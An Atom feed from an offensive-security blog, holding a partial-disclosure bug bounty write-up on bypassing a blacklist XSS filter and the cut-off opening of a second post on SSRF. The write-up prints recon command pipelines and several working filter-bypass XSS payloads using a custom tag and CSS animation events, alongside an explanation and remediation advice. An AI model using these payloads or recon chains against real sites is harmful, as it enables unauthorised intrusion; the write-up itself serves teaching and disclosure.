<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="https://hackcommander.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://hackcommander.github.io/" rel="alternate" type="text/html" /><updated>2025-08-11T00:39:38+02:00</updated><id>https://hackcommander.github.io/feed.xml</id><title type="html">hackcommander.github.io</title><subtitle>This is my personal blog where I talk about science and technology, especially about offensive cybersecurity.</subtitle><author><name>Iván Santos Malpica&lt;br&gt;(Aka. HackCommander)</name><email>ivansantosmalpica.contact@gmail.com</email></author><entry><title type="html">Defeating XSS filters using unexpected HTML tags and attributes</title><link href="https://hackcommander.github.io/posts/2025/03/30/defeating-xss-filters-using-unexpected-html-tags-and-attributes/" rel="alternate" type="text/html" title="Defeating XSS filters using unexpected HTML tags and attributes" /><published>2025-03-30T00:00:00+01:00</published><updated>2025-03-30T00:00:00+01:00</updated><id>https://hackcommander.github.io/posts/2025/03/30/defeating-xss-filters-using-unexpected-html-tags-and-attributes</id><content type="html" xml:base="https://hackcommander.github.io/posts/2025/03/30/defeating-xss-filters-using-unexpected-html-tags-and-attributes/">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-1&quot;&gt;1. Asset discovery&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-2&quot;&gt;2. Vulnerability discovery&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-3&quot;&gt;3. Vulnerability exploitation&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-3-1&quot;&gt;3.1. Steps of exploitation&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-3-2&quot;&gt;3.2. Why does the payload work?&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-4&quot;&gt;4. Report resolution&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-5&quot;&gt;5. Lessons learned&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/general/bug-bounty.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;:warning: &lt;span style=&quot;color:red&quot;&gt;This bug was reported in a private program in which it is not allowed to publish the vulnerabilities found. So this is a partial disclosure, only the essential technical details are exposed.&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;In this post, I’m going to explain a tricky XSS that I found a few years ago while doing bug bounty. This isn’t a mind-blowing finding, as I simply managed to bypass the filters and execute an &lt;em&gt;alert()&lt;/em&gt;. However, I decided to write about it for several reasons:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;It may be useful for bug bounty hunters.&lt;/strong&gt; Those who struggle with bypassing WAFs, filters, or sanitization mechanisms when exploiting XSS might find inspiration in this post to develop their own payloads manually and lose less money on collaborations.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;It may also be valuable for pentesters.&lt;/strong&gt; As you can see on my LinkedIn, although I started my career in offensive security as a bug bounty hunter, I later worked as a pentester for cybersecurity consulting firms. During my time as a pentester, I noticed something very interesting: many pentesters who don’t do bug bounty often struggle to bypass WAFs, filters, or sanitization mechanisms. Since audit timelines are usually tight, they are often able to detect the XSS but fail to find a working payload, and because they never have the time to practice, they never truly master the technique. It is a vicious cycle. In this post, I will share a general methodology that can help, even when working under time constraints.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;I hope you enjoy it!&lt;/p&gt;

&lt;div id=&quot;section-id-1&quot; /&gt;

&lt;h2 id=&quot;1-asset-discovery&quot;&gt;1. Asset discovery&lt;/h2&gt;

&lt;p&gt;I found this asset through amass + httpx. If you are looking for http services on subdomains of the domain example.com and you have your config file in the path &lt;em&gt;/home/user/.config/amass/config.ini&lt;/em&gt;, you can use the following command&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;amass enum -brute -d example.com &apos;/home/user/.config/amass/config.ini&apos; | httpx -title -tech-detect -status-code -ip -p 66,80,81,443,445,457,1080,1100,1241,1352,1433,1434,1521,1944,2301,3000,3128,3306,4000,4001,4002,4100,5000,5432,5800,5801,5802,6082,6346,6347,7001,7002,8080,8443,8888,30821
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/OWASP/Amass&quot;&gt;Amass&lt;/a&gt; is an OSINT tool to perform network mapping of attack surfaces and external asset discovery which is a very famous tool used in the recon step in bug bounty. The output of the above amass command is a list of subdomains of the given domain, i.e, a list of potential targets.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/projectdiscovery/httpx&quot;&gt;Httpx&lt;/a&gt; is a multi-purpose HTTP toolkit allow to run multiple probers. In this case, the input of httpx is a list of subdomains and the output is a list of subdomains that have an http service in any of the ports given as a parameter. Also it shows some additional information about the service such as the title, the detected technologies… that I have specified in the parameters to be displayed.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;This domain is one of the most important domains of the company&lt;/strong&gt;, so it could also be obtained by googling the name of the company without the need to use any specific subdomain discovery tool.&lt;/p&gt;

&lt;div id=&quot;section-id-2&quot; /&gt;

&lt;h2 id=&quot;2-vulnerability-discovery&quot;&gt;2. Vulnerability discovery&lt;/h2&gt;

&lt;p&gt;I found this vulnerability through waymore + kxss. If you are looking for XSS in the subdomain www.example.com, you can execute the following commands&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;python3 waymore.py -i www.example.com -mode U
cd ~/waymore/results/www.example.com
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;cat waymore.txt | grep &quot;?&quot; | uro &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;param.txt
&lt;span class=&quot;gp&quot;&gt;cat param.txt | kxss &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;kxss.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/xnl-h4ck3r/waymore&quot;&gt;Waymore&lt;/a&gt; is a tool used to fetch known URLs from the Wayback Machine, Common Crawl, AlienVault’s Open Threat Exchange, URLScan Virus Total and Intelligence X for any given domain. This tool does not always find all the URLs of a domain but it is a good starting point to search XSS or other types of vulnerabilities. The biggest difference between waymore and other tools is that it can also download the archived responses for URLs on wayback machine so that you can then search these for even more links, developer comments, extra parameters, etc.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/Emoe/kxss&quot;&gt;Kxss&lt;/a&gt; is a tool used to find all the “problematic characters” that are reflected in the response of any URL given as a parameter. The reflection of some problematic characters does not mean that an XSS exists but it is an indication that it could exist.&lt;/p&gt;

&lt;p&gt;The code above runs waymore to gather URLs for www.example.com in “U” mode (URL collection), then filters URLs with parameters (containing “?”) and extracts them into param.txt. Finally, it pipes those URLs into kxss to detect potential XSS reflections, saving the results to kxss.txt.&lt;/p&gt;

&lt;p&gt;I no longer have the output file, but the result contained some lines as follows&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2025-03-30-defeating-xss-filters-using-unexpected-html-tags-and-attributes/waymore-kxss-output.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;where red color is obfuscating the XSS candidate URLs and parameters.&lt;/p&gt;

&lt;div id=&quot;section-id-3&quot; /&gt;

&lt;h2 id=&quot;3-vulnerability-exploitation&quot;&gt;3. Vulnerability exploitation&lt;/h2&gt;

&lt;div id=&quot;section-id-3-1&quot; /&gt;

&lt;h2 id=&quot;31-steps-of-exploitation&quot;&gt;3.1. Steps of exploitation&lt;/h2&gt;

&lt;p&gt;The URL was some sort of resource for redeeming benefits or activating promotions. The vulnerable parameter was the parameter &lt;em&gt;code&lt;/em&gt;, which should be the promotion code or something like that. So I first sent the &amp;lt; character and the response was as follows&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2025-03-30-defeating-xss-filters-using-unexpected-html-tags-and-attributes/burp-repeater-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The response was an HTTP 400 code, and considering that the initial scan showed that the &amp;lt; character was reflected, I thought it might be an encoding issue. So, I sent the same &amp;lt; character but URL-encoded and the response was as follows&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2025-03-30-defeating-xss-filters-using-unexpected-html-tags-and-attributes/burp-repeater-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In this case the server responded with HTTP code 200 and the character was reflected correctly.&lt;/p&gt;

&lt;p&gt;Then I sent the payload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;&lt;/code&gt; to check if I could send HTML tags&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2025-03-30-defeating-xss-filters-using-unexpected-html-tags-and-attributes/burp-repeater-3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;but the server responded with a security redirection, returning HTTP code 302. This could mean that the filter was blocking any type of HTML tag or maybe only script tags. To check it out, I sent the tag &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;img src=1&amp;gt;&lt;/code&gt; and I got the following response&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2025-03-30-defeating-xss-filters-using-unexpected-html-tags-and-attributes/burp-repeater-4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;HTTP code 200, great! This means the filter is flexible, and I can send HTML tags with attributes, so I can play a bit :smiling_imp:&lt;/p&gt;

&lt;p&gt;Then I sent the payload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;img src=1 onerror=&quot;&quot;&amp;gt;&lt;/code&gt; to check if I can inject JavaScript code, that means, whether the filter accepts all types of attributes or blocks certain dangerous attributes. The response was the following&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2025-03-30-defeating-xss-filters-using-unexpected-html-tags-and-attributes/burp-repeater-5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The server responded with a security redirection, which implies that the server does block certain attributes.&lt;/p&gt;

&lt;p&gt;To determine which attributes the filter was blocking, I performed fuzzing on the attribute using all possible events from the &lt;a href=&quot;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&quot;&gt;cross-site scripting (XSS) cheat sheet&lt;/a&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2025-03-30-defeating-xss-filters-using-unexpected-html-tags-and-attributes/cheat-sheet-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The result of performing the fuzzing with burp intruder was as follows:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2025-03-30-defeating-xss-filters-using-unexpected-html-tags-and-attributes/burp-intruder.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This fuzzing reveals different events that can be used within an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;img&amp;gt;&lt;/code&gt; tag specifically, those associated with an HTTP 200 status code. For example, the filter accepts inputs in the form of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;img src=1 onafterscriptexecute=&quot;&quot;&amp;gt;&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;However, it’s important to note that the filter may allow these events for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;img&amp;gt;&lt;/code&gt; tag while accepting different events for other tags. This would require a more general fuzzing approach, combining all tags with all possible events, that is, performing a cluster bomb attack using as parameters the tag name and the event. As we will see next, this case is simpler, as it seems to only blacklist events without considering the tag they are in.&lt;/p&gt;

&lt;p&gt;At this point I changed strategy and, instead of continuing to use the img tag, I looked for payloads that used the events found in the fuzzing and did not require user interaction to execute. I only had to test the first 3 payloads:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2025-03-30-defeating-xss-filters-using-unexpected-html-tags-and-attributes/cheat-sheet-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I didn’t even test the payload associated with the &lt;em&gt;onafterscriptexecute&lt;/em&gt; event because, as you may remember, the filter blocks &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;&lt;/code&gt; tags, so it’s guaranteed to fail.&lt;/p&gt;

&lt;p&gt;Using the payload of the &lt;em&gt;onanimationcancel&lt;/em&gt; attribute and changing the payload from &lt;em&gt;print&lt;/em&gt; to &lt;em&gt;alert&lt;/em&gt;, that is, using the payload&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;style&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;@keyframes&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;left&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;left&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1000px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}}&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;:target&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;animation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;10s&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ease-in-out&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0s&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/style&amp;gt;&amp;lt;xss&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;position:absolute;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onanimationcancel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;alert(1)&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/xss&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;the response was the following&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2025-03-30-defeating-xss-filters-using-unexpected-html-tags-and-attributes/burp-repeater-6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This implies that the filter is blocking this payload. The question is… is it blocking any of the tags, any of the attributes or the javascript code? To check if it was blocking the JavaScript code I changed it to the following code&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[].map.call`${alert}1`
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;which we have already seen in previous posts, resulting in the payload as follows&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;style&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;@keyframes&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;left&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;left&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1000px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}}&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;:target&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;animation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;10s&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ease-in-out&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0s&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/style&amp;gt;&amp;lt;xss&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;position:absolute;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onanimationcancel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[].map.call`${alert}1`&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/xss&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When I sent the payload, the response was the following&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2025-03-30-defeating-xss-filters-using-unexpected-html-tags-and-attributes/burp-repeater-7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Great! The answer fully reflects the payload, so the problem was the JavaScript code, but the &lt;em&gt;alert&lt;/em&gt; function was not executed. This code defines a CSS animation that moves an element when it becomes the target and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;xss&amp;gt;&lt;/code&gt; element has an onanimationcancel event that, when triggered, executes the JavaScript payload. So I think the JavaScript payload didn’t execute, among other reasons, because I forgot to add #x to the URL :laughing:&lt;/p&gt;

&lt;p&gt;Then I tried the payload of the &lt;em&gt;onanimationend&lt;/em&gt; event, but changing the JavaScript code for the one I discovered in the previous payload, resulting in the following payload&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;style&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;@keyframes&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/style&amp;gt;&amp;lt;xss&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;animation-name:x&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onanimationend=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[].map.call`${alert}1`&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/xss&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I got the following response&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2025-03-30-defeating-xss-filters-using-unexpected-html-tags-and-attributes/burp-repeater-8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;and the alert function is executed&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2025-03-30-defeating-xss-filters-using-unexpected-html-tags-and-attributes/alert.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div id=&quot;section-id-3-2&quot; /&gt;

&lt;h2 id=&quot;32-why-does-the-payload-work&quot;&gt;3.2. Why does the payload work?&lt;/h2&gt;

&lt;p&gt;The main reason the payload works is because the &lt;strong&gt;XSS filter is deficient&lt;/strong&gt;. It implements a blacklist of tags and attributes that it considers dangerous, but it doesn’t cover all possible cases and leaves dangerous tag and attribute combinations unfiltered. Using a blacklist as a filtering method is not secure for this reason, so it’s better to implement a whitelist or a regex that only allows inputs following a specific structure.&lt;/p&gt;

&lt;p&gt;On the other hand, it remains to be explained what the payload used does. First of all, it is defined the CSS animation:&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;style&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;@keyframes&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/style&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This code defines an empty animation called &lt;em&gt;x&lt;/em&gt;. The fact that it does nothing specific inside the {} doesn’t affect the purpose of the code, as the animation is simply used as a trigger for the &lt;em&gt;onanimationend&lt;/em&gt; event in the next step.&lt;/p&gt;

&lt;p&gt;After this, it is defined the xss element:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;xss&amp;gt;:&lt;/code&gt; this is a fictitious element or custom tag, which doesn’t have a specific purpose in standard HTML, but some browsers process it as valid.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;style=&quot;animation-name:x&quot;:&lt;/code&gt; the animation x defined earlier is applied to the element. Even though the animation doesn’t have any visible effects because it’s empty, it still generates an event when it ends, which is what matters here.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;onanimationend=&quot;[].map.call${alert}1&quot;:&lt;/code&gt; the onanimationend event fires when the x animation ends, even though it does nothing visually. When this happens, the JavaScript code is executed, displaying the &lt;em&gt;alert&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So, this is the execution flow when the victim access to the vulnerable link:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;The x animation is applied to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;xss&amp;gt;&lt;/code&gt; element.&lt;/li&gt;
  &lt;li&gt;Even though the animation doesn’t do anything visually, the browser triggers the &lt;em&gt;onanimationend&lt;/em&gt; event when the animation finishes.&lt;/li&gt;
  &lt;li&gt;When the &lt;em&gt;onanimationend&lt;/em&gt; event is fired, the malicious JavaScript code is executed, displaying an &lt;em&gt;alert&lt;/em&gt; in the browser.&lt;/li&gt;
&lt;/ol&gt;

&lt;div id=&quot;section-id-4&quot; /&gt;

&lt;h2 id=&quot;4-report-resolution&quot;&gt;4. Report resolution&lt;/h2&gt;

&lt;p&gt;As I said before, the affected domain was one the most important domains of the company so the asset criticity was classified as high. In fact at the time I reported this vulnerability there was a 3X reward multiplier on any vulnerability reported in certain domains of the company, including this one. Also an XSS usually is considered a medium severity vulnerability and because I wasn’t able to sign up and log in the website, I couldn’t demonstrate a high impact such as session hijacking. Therefore, the report was classified as&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Asset criticity&lt;/strong&gt;: High&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Vulnerability severity&lt;/strong&gt;: Medium&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Bounty&lt;/strong&gt;: More than $600 (because of the 3X reward multiplier)&lt;/li&gt;
&lt;/ul&gt;

&lt;div id=&quot;section-id-5&quot; /&gt;

&lt;h2 id=&quot;5-lessons-learned&quot;&gt;5. Lessons learned&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Don’t base your tests on using predefined payload lists or randomly copying and pasting payloads, as they may require modifications.&lt;/strong&gt; As we’ve seen, the payload associated with the &lt;em&gt;onanimationend&lt;/em&gt; event worked in the end, but only after modifying the JavaScript payload (which was initially rejected by the filter) with one I discovered during manual testing. If I had used the predefined payload with the original JavaScript, the server would have rejected the request with a security redirect.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Take your time, reading and understanding the payloads you’re using.&lt;/strong&gt; We saw how I found a valid payload related to the &lt;em&gt;onanimationcancel&lt;/em&gt; event, but I couldn’t execute the alert because I didn’t take the time to understand the payload. Instead, I rushed ahead and quickly moved on to the next event. If I had stopped to read and understand the payload, I probably would have realized I needed to add #x to the URL to trigger the alert.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Frame your testing within a general strategy, but don’t go overboard with unnecessary tests too early.&lt;/strong&gt; In this case, I started with some manual testing and later moved on to some fuzzing to determine which attributes the filter accepted for the img tag. Then, I continued the exploitation, assuming that those attributes would be accepted not just for the img tag, but for all tags, and I was correct. Start with manual testing and some basic fuzzing, and if things don’t go as expected, reassess your hypotheses and perform a more thorough scan or advanced fuzzing.&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Iván Santos Malpica&lt;br&gt;(Aka. HackCommander)</name><email>ivansantosmalpica.contact@gmail.com</email></author><category term="bug bounty" /><category term="web" /><category term="osint" /><category term="amass" /><category term="httpx" /><category term="waymore" /><category term="kxss" /><category term="burpsuite" /><category term="portswigger" /><category term="xss" /><category term="bypass" /><summary type="html">Partial disclosure of a bug bounty report: defeating XSS filters using unexpected HTML tags and attributes.</summary></entry><entry><title type="html">Breaking the perimeter by exploiting routing-based SSRF via a misconfigured load balancer</title><link href="https://hackcommander.github.io/posts/2024/12/07/breaking-the-perimeter-by-exploiting-routing-based-ssrf-via-a-misconfigured-load-balancer/" rel="alternate" type="text/html" title="Breaking the perimeter by exploiting routing-based SSRF via a misconfigured load balancer" /><published>2024-12-07T00:00:00+01:00</published><updated>2024-12-07T00:00:00+01:00</updated><id>https://hackcommander.github.io/posts/2024/12/07/breaking-the-perimeter-by-exploiting-routing-based-ssrf-via-a-misconfigured-load-balancer</id><content type="html" xml:base="https://hackcommander.github.io/posts/2024/12/07/breaking-the-perimeter-by-exploiting-routing-based-ssrf-via-a-misconfigured-load-balancer/">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-1&quot;&gt;1. Asset discovery&lt;/a&gt;&lt;/li&gt;
